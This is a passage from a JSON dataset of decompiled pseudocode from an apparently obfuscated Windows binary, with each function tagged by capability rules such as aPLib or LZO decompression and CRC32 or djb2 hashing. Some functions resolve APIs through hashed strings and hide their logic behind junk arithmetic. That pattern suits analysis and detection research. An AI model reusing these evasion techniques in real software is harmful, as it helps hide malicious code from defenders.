puVar2[0x37] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 7 | uVar4 << 0x19);\n            uVar4 = uVar4 ^ uVar4 >> 7;\n            puVar2[0x59] = (uVar4 << 5 | uVar3 >> 0x1b) ^ uVar4;\n            puVar2[0x58] = uVar3 << 5 ^ uVar3;\n            uVar3 = puVar2[-0x2c] & puVar2[0x1c] ^ puVar2[0x36] & puVar2[0x30] ^ puVar2[-0x58] ^ puVar2[0x38] ^ var_10h;\n            uVar4 = puVar2[-0x2b] & puVar2[0x1d] ^ puVar2[0x37] & puVar2[0x31] ^ puVar2[-0x57] ^ puVar2[0x39] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 6 | uVar4 << 0x1a);\n            uVar4 = uVar4 ^ uVar4 >> 6;\n            puVar2[0x5b] = (uVar4 << 0x1f | uVar3 >> 1) ^ uVar4;\n            puVar2[0x5a] = uVar3 << 0x1f ^ uVar3;\n            uVar3 = puVar2[-0x2a] & puVar2[0x1e] ^ puVar2[0x38] & puVar2[0x32] ^ puVar2[-0x56] ^ puVar2[0x3a] ^ var_10h;\n            uVar4 = puVar2[-0x29] & puVar2[0x1f] ^ puVar2[0x39] & puVar2[0x33] ^ puVar2[-0x55] ^ puVar2[0x3b] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xc | uVar4 << 0x14);\n            uVar4 = uVar4 ^ uVar4 >> 0xc;\n            puVar2[0x5c] = uVar3 << 9 ^ uVar3;\n            puVar2[0x5d] = (uVar4 << 9 | uVar3 >> 0x17) ^ uVar4;\n            uVar3 = var_10h >> 0x1f;\n            var_10h = var_10h & 0x2425cfa0 ^ var_ch >> 0x1f ^ var_10h * 2;\n            var_ch = var_ch & 0x7311c281 ^ (var_ch << 1 | uVar3);\n            var_8h = var_8h + -1;\n            puVar2 = puVar1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 4033
    },
    "0040f013": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040f013(uint *arg_8h, uint *arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h, uint32_t arg_24h, uint32_t arg_28h, uint *arg_2ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = 0x4127f8;\n    puVar5 = arg_8h;\n    for (iVar1 = 0x1e; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar4 = arg_8h + 0x1e;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        puVar4 = puVar4 + 1;\n    }\n    arg_8h[0x2f] = in_EAX << 0x18 | arg_10h >> 0x1f;\n    arg_8h[0x2e] = arg_10h;\n    arg_1ch = (arg_14h << 8 | arg_18h) << 4 | arg_1ch;\n    uVar2 = arg_1ch << 0x10 | arg_20h;\n    uVar3 = uVar2 << 8 | arg_24h;\n    arg_8h[0x31] = ((arg_1ch >> 0x10 | arg_20h >> 0x1f) << 8 | uVar2 >> 0x18 | arg_24h >> 0x1f) << 0xc | uVar3 >> 0x14 |\n                   arg_28h >> 0x1f;\n    arg_8h[0x30] = uVar3 << 0xc | arg_28h;\n    puVar4 = arg_8h + 0x32;\n    for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *arg_2ch;\n        arg_2ch = arg_2ch + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 608
    },
    "0040c3ba": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c7b3)\n// WARNING: Removing unreachable block (ram,0x0040c515)\n// WARNING: Removing unreachable block (ram,0x0040c51b)\n// WARNING: Removing unreachable block (ram,0x0040c525)\n// WARNING: Removing unreachable block (ram,0x0040c52b)\n// WARNING: Removing unreachable block (ram,0x0040c908)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040c3ba(uint32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t arg_ch_00;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint16_t *in_ECX;\n    uint32_t uVar12;\n    uint uVar13;\n    uint extraout_ECX;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    uVar4 = *0x414007;\n    fcn.0040bdb9(*0x414007);\n    *0x414008 = 0;\n    if (arg_10h < 0) {\n        fcn.0040bdb9(0x33);\n        arg_ch_00 = arg_10h & 0xffff;\n        uVar12 = uVar4;\n        *0x414008 = *0x414008 * 0x3795ef << (uVar4 & 0x1f);\n        uVar1 = *in_ECX;\n        arg_10h = arg_10h >> 0x10;\n        fcn.0040bde1(*0x414170);\n        uVar2 = in_ECX[1];\n        uVar8 = uVar2;\n        iVar7 = fcn.0040bdb9(uVar4);\n        *0x414008 = *0x414008 - iVar7;\n        var_18h = in_ECX[2];\n        fcn.0040bdb9(0x59);\n        uVar3 = in_ECX[3];\n        iVar14 = -(uVar3 < arg_10h);\n        iVar7 = iVar14 + 1;\n        if (iVar7 != 0) {\n            *0x414008 = 0x2081a0;\n            *0x414008 = fcn.0040bde1(1);\n            if (((uVar3 - arg_10h) * 0x10000 | var_18h) < arg_ch_00) {\n                fcn.0040bdb9(uVar4);\n                iVar7 = iVar14;\n            }\n        }\n        uVar11 = *(in_ECX + 2);\n        *0x414008 = 0x3795e3;\n        if (iVar7 != 0) {\n            if (var_18h < 0x3795fc) {\n                fcn.0040bdb9(0x41);\n            }\n            else {\n                uVar5 = fcn.0040bde1(*0x414024);\n                var_18h = var_18h << (uVar5 & 0x1f);\n            }\n            fcn.0040c2f3(arg_10h, arg_ch_00);\n            var_24h = 5;\n            do {\n                uVar13 = 0;\n                if ((((uVar12 < 0) || (*0x414008 + 0x50 < uVar12)) || ((var_18h ^ 0x1a) < *0x414008)) &&\n                   (var_18h - 0xe3 != *0x414008)) {\n                    if (((*0x414008 - 0x97 < 0x3795ba) &&\n                        (iVar14 = fcn.0040bdb9(uVar4),  uVar13 = extraout_ECX,  iVar14 - 0x9cU <= *0x414008)) ||\n                       (0x3795e2 < *0x414008)) {\n                        fcn.0040bdb9(0x49);\n                    }\n                    else {\n                        uVar9 = fcn.0040bde1(uVar13);\n                        if ((*0x414008 < uVar9) ||\n                           ((uVar9 = fcn.0040bdb9(0x41),  var_18h != uVar9 && (*0x414008 < 0x24)))) {\n                            *0x414008 = 0;\n                        }\n                    }\n                }\n                else {\n                    *0x414008 = *0x414008 ^ uVar12;\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        *0x414008 = *0x414008 * 0x3795e3;\n        fcn.0040bdb9(uVar4);\n        uVar9 = uVar11 / arg_10h;\n        *0x414008 = 0x37968a;\n        iVar14 = uVar11 - uVar9 * arg_10h;\n        uVar5 = fcn.0040bde1(1);\n        *0x414008 = (*0x414008 >> (uVar5 & 0x1f)) * 0x3795ef;\n        if ((uVar9 == 0x10000) ||\n           (uVar10 = iVar14 * 0x10000 | uVar8,  uVar15 = uVar9, \n           uVar10 <= uVar9 * arg_ch_00 && uVar9 * arg_ch_00 - uVar10 != 0)) {\n            cVar6 = var_5h * *0x414008 * ' ';\n            uVar15 = uVar9 - 1;\n            fcn.0040bdb9(0x2a);\n            uVar10 = iVar14 + arg_10h;\n            fcn.0040bdb9(0x4f);\n            fcn.0040bde1(*0x4140cc);\n            if ((uVar10 < 0x10000) &&\n               (uVar10 = uVar10 * 0x10000 | uVar8,  uVar10 <= uVar15 * arg_ch_00 && uVar15 * arg_ch_00 - uVar10 != 0)) {\n                iVar14 = fcn.0040bdb9(0x6b);\n                if ((iVar14 * 0xbb < *0x414008 || iVar14 * 0xbb - *0x414008 == 0) ||\n                   ((*0x414008 ^ 0xb) < (cVar6 | 0xadU))) {\n                    fcn.0040bdb9(uVar4);\n                }\n                uVar15 = uVar9 - 2;\n                *0x414008 = *0x414008 >> (cVar6 + 0x66U & 0x1f);\n            }\n            fcn.0040bde1(0);\n        }\n        *0x414008 = (uVar12 ^ *0x414008 | 0x379671) & uVar12;\n        uVar8 = uVar11 << 0x10 | uVar8;\n        fcn.0040c2f3(arg_10h, arg_ch_00);\n        fcn.0040bdb9(uVar4);\n        if ((((uVar4 != 0) || (iVar14 = fcn.0040bde1(0),  uVar12 - 0xf8 <= iVar14)) && (0x3795e3 < *0x414008)) &&\n           (uVar12 <= *0x414008)) {\n            fcn.0040bdb9(uVar4);\n        }\n        *0x414008 = *0x414008 & uVar12;\n        *arg_8h = uVar15 << 0x10;\n        uVar12 = *0x414007;\n        if ((((*0x414008 | 0x1a) <= uVar12) || (uVar11 = fcn.0040bde1(0),  *0x414008 - 0xdb <= uVar11)) ||\n           (uVar12 < *0x414008 + 0x59)) {\n            iVar14 = fcn.0040bde1(0);\n            *0x414008 = *0x414008 + iVar14;\n        }\n        uVar12 = uVar8 / arg_10h;\n        iVar16 = uVar8 - uVar12 * arg_10h;\n        iVar14 = fcn.0040bde1(*0x414078);\n        *0x414008 = iVar14 - 0x6a1dU & 0x11408;\n        if ((uVar12 == 0x10000) ||\n           (uVar11 = iVar16 * 0x10000 | uVar1,  uVar8 = uVar12, \n           uVar11 <= uVar12 * arg_ch_00 && uVar12 * arg_ch_00 - uVar11 != 0)) {\n            fcn.0040bde1(*0x414018);\n            fcn.0040bdb9(0x7c);\n            uVar11 = iVar16 + arg_10h;\n            uVar8 = uVar12 - 1;\n            if ((uVar11 < 0x10000) &&\n               (uVar11 = uVar11 * 0x10000 | uVar1,  uVar11 <= uVar8 * arg_ch_00 && uVar8 * arg_ch_00 - uVar11 != 0)) {\n                uVar8 = uVar12 - 2;\n            }\n        }\n        *0x414008 = (*0x414008 ^ 0x37969b) * *0x414007 >> (*0x414007 & 0x1f);\n        fcn.0040c2f3(arg_10h, arg_ch_00);\n        *0x414008 = 0x379552;\n        iVar14 = fcn.0040bdb9(0x59);\n        *0x414008 = *0x414008 & iVar14 * 0xae;\n        *arg_8h = *arg_8h | uVar8 & 0xffff;\n        uVar4 = *0x414007;\n        iVar16 = *0x414007;\n        iVar14 = fcn.0040bde1(*0x4140fc);\n        if (iVar14 == iVar16) {\n            fcn.0040bdb9(0x4b);\n        }\n        else {\n            iVar14 = 4;\n            do {\n                fcn.0040bde1(*0x41417c);\n                iVar14 = iVar14 + -1;\n            } while (iVar14 != 0);\n        }\n        *arg_ch = CONCAT22(uVar2, uVar1);\n        *0x414008 = *0x414008 >> (uVar4 - 0x1a & 0x1f);\n    }\n    else {\n        *arg_ch = 0;\n        *arg_8h = 0;\n        *0x414008 = 0;\n        iVar7 = -1;\n    }\n    return iVar7;\n}\n",
        "token_count": 2622
    },
    "0040cf7b": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cf7b(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        uVar4 = fcn.0040cf67(param_2);\n        iVar1 = uVar4;\n        if (iVar1 != 0) {\n            iVar3 = 0;\n            uVar2 = 0x80000000;\n            do {\n                if ((uVar2 & *((uVar4 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n                iVar3 = iVar3 + 1;\n                uVar2 = uVar2 >> 1;\n            } while (uVar2 != 0);\n            return iVar1 * 0x20 - iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 229
    },
    "0040a79c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint fcn.0040a79c(int32_t param_1, uint param_2, uint param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t n;\n    \n    n = param_1 + 0x1fU >> 5;\n    fcn.0040a29a(n);\n    fcn.004070e4(*in_EAX, n << 2, param_2, param_3);\n    uVar3 = 1;\n    for (uVar2 = param_1 - 1U & 0x1f; uVar2 != 0; uVar2 = uVar2 - 1) {\n        uVar3 = uVar3 | uVar3 * 2;\n    }\n    puVar1 = *in_EAX + -4 + n * 4;\n    *puVar1 = *puVar1 & uVar3;\n    in_EAX[1] = n;\n    return 0;\n}\n",
        "token_count": 238
    },
    "0040d181": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0040d181(uint32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    \n    if (param_3 <= param_1 >> 5) {\n        return 0xffffffff;\n    }\n    puVar1 = param_2 + (param_1 >> 5) * 4;\n    *puVar1 = *puVar1 | 1 << (param_1 & 0x1f);\n    return 0;\n}\n",
        "token_count": 119
    },
    "004054d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004054d4(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00406209(0x4125c8, 5, 0xaff93129, arg_8h, arg_ch + 0x30);\n    iVar1 = fcn.00409428(arg_8h_00, arg_8h);\n    if (iVar1 != 0) {\n        if ((*(arg_ch + 4) & 1) != 0) {\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(0, *(arg_ch + 4) & 0xfffffffe);\n        }\n        fcn.0040548e(0, iVar1);\n    }\n    return 1;\n}\n",
        "token_count": 203
    },
    "00408708": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408708(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if ((*0x42f194 & 1) == 0) {\n        *0x42f194 = *0x42f194 | 1;\n        uVar1 = fcn.00405e30(0x4126e0, 0xe, 0xd8365b15, 0);\n        uVar2 = fcn.00405e30(0x4126f0, 8, 0xac7741bb, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2, uVar1);\n        *0x42f190 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    }\n    if (*0x42f190 != NULL) {\n        (**0x42f190)(arg_8h, &var_4h);\n    }\n    return var_4h != 0;\n}\n",
        "token_count": 246
    },
    "00409069": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409069(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar2 = arg_8h;\n    if ((arg_8h & 1) != 0) {\n        uVar1 = fcn.00406209(0x412754, 0x1a, 0x3c28d752);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 2) != 0) {\n        uVar1 = fcn.00406209(0x412770, 0x1a, 0x1427947f);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar1 = fcn.00406209(0x41278c, 10, 0x6791865c);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar1 = fcn.00406209(0x412798, 1, 0x5f67b185);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 0x10) != 0) {\n        uVar1 = fcn.00406209(0x41279c, 1, 0x752e91bb);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 0x20) != 0) {\n        uVar1 = fcn.00406209(0x4127a0, 1, 0x826f37df);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 0x40) != 0) {\n        uVar1 = fcn.00406209(0x4127a4, 0xb, 0xee9f9ead);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    if ((arg_8h & 0x80) != 0) {\n        uVar1 = fcn.00406209(0x4127b0, 8, 0xf0c976e1);\n        uVar2 = fcn.0040954d(uVar1);\n    }\n    *arg_ch = uVar2;\n    return 0;\n}\n",
        "token_count": 595
    },
    "0040a862": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a862(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    if ('d' < param_1) {\n        if (param_1 < 'q') {\n            if (param_1 != 'p') {\n                if ('d' < param_1) {\n                    if (param_1 < 'h') {\ncode_r0x0040a94f:\n                        *in_EAX = 10;\n                        goto code_r0x0040a993;\n                    }\n                    if (param_1 == 'i') goto code_r0x0040a939;\n                    if (param_1 == 'o') {\n                        if ((in_EAX[1] & 0x13U) == 0) {\n                            in_EAX[1] = in_EAX[1] | 1;\n                        }\n                        *in_EAX = 8;\n                        goto code_r0x0040a993;\n                    }\n                }\n                goto code_r0x0040a969;\n            }\ncode_r0x0040a899:\n            in_EAX[1] = in_EAX[1] | 0x20;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                iVar1 = ((*(in_EAX + 1) & 5) != 0) + 3;\n                goto code_r0x0040a991;\n            }\n            if (param_1 == 'u') {\n                if ((in_EAX[1] & 0x13U) == 0) {\n                    in_EAX[1] = in_EAX[1] | 1;\n                }\n                *in_EAX = 6;\n                goto code_r0x0040a993;\n            }\n            if (param_1 != 'x') goto code_r0x0040a969;\n        }\ncode_r0x0040a8a4:\n        if ((in_EAX[1] & 0x33U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 7;\n        goto code_r0x0040a993;\n    }\n    if (param_1 == 'd') {\ncode_r0x0040a939:\n        if ((in_EAX[1] & 0x13U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 5;\n        goto code_r0x0040a993;\n    }\n    if (param_1 < 'T') {\n        if (param_1 == 'S') {\n            iVar1 = 4 - ((in_EAX[1] & 6U) != 0);\n        }\n        else {\n            if (param_1 != 'C') {\n                if ((param_1 == 'E') || (param_1 == 'G')) goto code_r0x0040a94f;\n                if (param_1 == 'P') goto code_r0x0040a899;\n                goto code_r0x0040a969;\n            }\n            bVar2 = (*(in_EAX + 1) & 2) == 0;\ncode_r0x0040a8c7:\n            iVar1 = bVar2 + 1;\n        }\ncode_r0x0040a991:\n        *in_EAX = iVar1;\n    }\n    else {\n        if (param_1 == 'X') goto code_r0x0040a8a4;\n        if (param_1 == '[') {\n            *in_EAX = 9;\n            goto code_r0x0040a993;\n        }\n        if (param_1 == 'c') {\n            bVar2 = (*(in_EAX + 1) & 1) != 0;\n            goto code_r0x0040a8c7;\n        }\ncode_r0x0040a969:\n        *in_EAX = 0;\n    }\ncode_r0x0040a993:\n    return *in_EAX;\n}\n",
        "token_count": 915
    },
    "0040d6fd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d6fd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *arg_ch_00;\n    uint8_t *arg_14h;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint8_t *arg_8h_02;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.0040bd94();\n    arg_14h = fcn.0040bd94();\n    arg_8h_00 = fcn.0040bd94();\n    arg_8h_01 = fcn.0040bd94();\n    fcn.0040cfad(arg_ch);\n    fcn.0040cfad(arg_10h);\n    iVar1 = fcn.0040cf16(arg_ch_00);\n    if (iVar1 < 0) {\n        fcn.0040cfad(arg_ch_00);\n        fcn.0040cfad(arg_14h);\n        fcn.0040cfad(arg_8h_01);\n    }\n    iVar1 = fcn.0040cf47(arg_14h);\n    if (iVar1 == 0) {\n        fcn.0040d411(arg_8h_00, arg_ch_00, unaff_ESI, arg_14h);\n        fcn.0040cfad(arg_14h);\n        fcn.0040cfad(arg_8h_00);\n        iVar1 = fcn.0040cf47(arg_14h);\n        if (iVar1 == 0) {\n            var_ch = 0;\n            while (((*arg_ch_00 & 1) == 0 && ((*arg_14h & 1) == 0))) {\n                fcn.0040d0be(arg_ch_00, arg_ch_00, 1, unaff_ESI);\n                fcn.0040d0be(arg_14h, arg_14h, 1, unaff_ESI);\n                var_ch = var_ch + 1;\n            }\n            while (iVar1 = fcn.0040cf47(arg_ch_00),  iVar1 == 0) {\n                while ((*arg_ch_00 & 1) == 0) {\n                    fcn.0040d0be(arg_ch_00, arg_ch_00, 1, unaff_ESI);\n                }\n                while ((*arg_14h & 1) == 0) {\n                    fcn.0040d0be(arg_14h, arg_14h, 1, unaff_ESI);\n                }\n                iVar1 = fcn.0040cf16(arg_14h);\n                arg_8h_02 = arg_14h;\n                if (0 < iVar1) {\n                    arg_8h_02 = arg_ch_00;\n                }\n                fcn.0040c9e9(arg_8h_02, unaff_ESI);\n                fcn.0040d0be(arg_8h_01, arg_8h_01, 1, unaff_ESI);\n                fcn.0040cf16(arg_ch_00);\n                fcn.0040cfad(arg_8h_01);\n            }\n            fcn.0040cff9(arg_8h, arg_14h, var_ch, unaff_ESI);\n            goto code_r0x0040d892;\n        }\n    }\n    fcn.0040cfad(arg_ch_00);\ncode_r0x0040d892:\n    if (arg_ch_00 != NULL) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_14h != NULL) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_01 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return 0;\n}\n",
        "token_count": 958
    },
    "0040d8ee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d8ee(uint arg_8h)\n\n{\n    uint8_t *arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h_01;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint unaff_ESI;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040bd94();\n    iVar1 = fcn.0040bd94();\n    puVar2 = fcn.0040bd94();\n    arg_8h_01 = fcn.0040bd94();\n    iVar3 = fcn.0040bd94();\n    iVar4 = fcn.0040bd94();\n    iVar5 = fcn.0040d32f();\n    if (iVar5 < 1) {\ncode_r0x0040da92:\n        var_1ch = 0;\n    }\n    else {\n        fcn.0040d1db(arg_8h);\n        fcn.0040cfad(iVar3);\n        fcn.0040cfc5();\n        while ((*arg_8h_00 & 1) == 0) {\n            fcn.0040d0be(arg_8h_00, arg_8h_00, 1, unaff_ESI);\n            fcn.0040d1a4(iVar1);\n        }\n        fcn.0040cf67(arg_8h);\n        var_18h = 0;\n        var_1ch = 1;\n        do {\n            fcn.0040cfc5();\n            do {\n                uVar6 = fcn.0040db32();\n                *puVar2 = uVar6;\n                iVar5 = fcn.0040cf16(puVar2);\n            } while (-1 < iVar5);\n            fcn.0040cfc5();\n            fcn.0040dcdf(arg_8h_01, arg_8h_00, arg_8h);\n            while (((iVar5 = fcn.0040cf47(iVar4),  iVar5 == 0 || (iVar5 = fcn.0040d32f(),  iVar5 != 0)) &&\n                   (iVar5 = fcn.0040cf16(arg_8h_01),  iVar5 != 0))) {\n                iVar5 = fcn.0040cf47(iVar4);\n                if ((iVar5 == 0) && (iVar5 = fcn.0040d32f(),  iVar5 == 0)) goto code_r0x0040da92;\n                fcn.0040d1a4(iVar4);\n                iVar5 = fcn.0040cf16(iVar4);\n                if (iVar5 < 0) {\n                    fcn.0040d48c(arg_8h_01, arg_8h_01, arg_8h_01, arg_8h);\n                }\n                iVar5 = fcn.0040cf16(iVar4);\n                if (-1 < iVar5) goto code_r0x0040da92;\n            }\n            var_18h = var_18h + 1;\n        } while (var_18h < 0x32);\n    }\n    if (arg_8h_00 != NULL) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (iVar1 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (puVar2 != NULL) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_01 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (iVar3 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (iVar4 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return var_1ch;\n}\n",
        "token_count": 989
    },
    "004068fd": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004068fd(int32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint uVar7;\n    uint8_t *puVar8;\n    int32_t unaff_EDI;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    uVar7 = *0x4144c4;\n    var_1h._0_1_ = *(unaff_EDI + 0x100);\n    uVar6 = *(unaff_EDI + 0x101);\n    *0x4141e4 = ((*0x4141e4 + 0x37d1227 >> (var_20h + 0x91U & 0x1f)) - *0x414bc8) + 0x1576363;\n    fcn.004066a9();\n    if (arg_10h != 0) {\n        var_8h = arg_ch;\n        var_ch = arg_10h;\n        do {\n            *0x4141e4 = *0x4141e4 + 0x2090432;\n            uVar4 = arg_10h;\n            if (((var_20h - 0xdeU == *0x4141e4) || (uVar3 = fcn.00406606(uVar7),  (uVar3 & 0xffff | 0x2a) <= *0x4141e4))\n               && (0x1d3bc23 < *0x4141e4)) {\n                *0x4141e4 = *0x4141e4 << (*0x414bd8 - (*0x4148e4 | 0x25) & 0x1f);\n                if (((*0x414be0 < 0x1d3bc15) || (fcn.00406606(uVar7),  (*0x4141e4 | 0xac) < 1)) ||\n                   (uVar3 = fcn.004066a9(),  uVar3 < 0x1d3bc15)) {\n                    uVar3 = fcn.00406606(uVar7);\n                    if ((uVar3 & 0xffff) * 0x9a == 0x1d3bbe9) {\n                        uVar3 = fcn.0040659d(0x365e);\n                        if (((((*0x4141e4 ^ 0x83) < (uVar3 & 0x73)) ||\n                             ((*0x4141e4 = 0,  0x1d3bc97 < *0x414be0 && (arg_10h == 0)))) &&\n                            (uVar4 = arg_10h,  uVar4 * 0x57 == 0x1d3bb4a)) &&\n                           (((*0x4141e4 != (*0x414bc8 & 0xeb) || (*0x4141e4 < 0)) && (uVar4 < (*0x4141e4 ^ 0x3e))))) {\n                            *0x4141e4 = *0x4141e4 << (arg_10h - (*0x4148e4 | 0x25) & 0x1f);\n                        }\n                    }\n                    else {\n                        fcn.0040659d(0x7fea);\n                    }\n                }\n            }\n            else {\n                *0x4141e4 = *0x4141e4 << (*0x414bc8 - 0x2aU & 0x1f);\n            }\n            arg_10h = uVar4;\n            var_1h._0_1_ = var_1h + 1;\n            puVar8 = var_1h + unaff_EDI;\n            uVar6 = uVar6 + *puVar8;\n            arg_10h = arg_10h & 0xffffff;\n            cVar2 = fcn.0040659d(*0x414bd8);\n            uVar1 = *puVar8;\n            *0x4141e4 = *0x4141e4 & cVar2;\n            *puVar8 = *(uVar6 + unaff_EDI);\n            *(uVar6 + unaff_EDI) = uVar1;\n            fcn.004066a9();\n            *var_8h = *((*puVar8 + uVar1 & 0xff) + unaff_EDI) ^ var_8h[arg_8h - arg_ch];\n            iVar5 = fcn.00406729(0x2090432);\n            *0x4141e4 = *0x4141e4 ^ iVar5 + 0x24U;\n            var_8h = var_8h + 1;\n            var_ch = var_ch - 1;\n            uVar7 = *0x4144c4;\n        } while (var_ch != 0);\n    }\n    fcn.00406510(*0x4148e4 & 0xffff, 0x2692fd7);\n    uVar3 = *0x4141e4;\n    *(unaff_EDI + 0x100) = var_1h;\n    uVar4 = uVar3 - 0x70;\n    if ((uVar4 != *0x414bc8) || (uVar4 >> 0x1f != *0x414bcc)) {\n        *0x4141e4 = uVar3 